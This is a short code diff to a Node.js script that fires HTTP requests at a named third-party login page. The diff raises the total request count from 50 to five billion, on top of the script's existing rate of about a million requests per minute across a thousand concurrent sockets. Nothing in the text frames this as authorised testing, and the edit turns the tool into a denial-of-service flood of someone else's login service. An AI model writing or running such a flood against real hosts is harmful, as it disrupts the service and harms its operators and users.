@@ -6,7 +6,7 @@ import http from 'http';
 
 // Configurable constants
 const TARGET_URL = 'https://2.52gs.co/chklogin.php';
-const TOTAL_REQUESTS = 50;
+const TOTAL_REQUESTS = 5000000000;
 const TARGET_RPS = 66667; // Target: ~1,000,000 requests per minute
 const CONCURRENCY_LIMIT = 1000; // Allow up to 2000 concurrent sockets
 const REQUEST_TIMEOUT_MS = 5000; // 5 seconds timeout per call
@@ -170,7 +170,7 @@ async function runAutomation() {
 
   async function saveReport() {
     const durationTotalSeconds = ((Date.now() - startTime) / 1000).toFixed(2);
-    
+
     responseTimes.sort((a, b) => a - b);
     const totalCalls = responseTimes.length;
     const minLatency = totalCalls > 0 ? responseTimes[0] : 0;
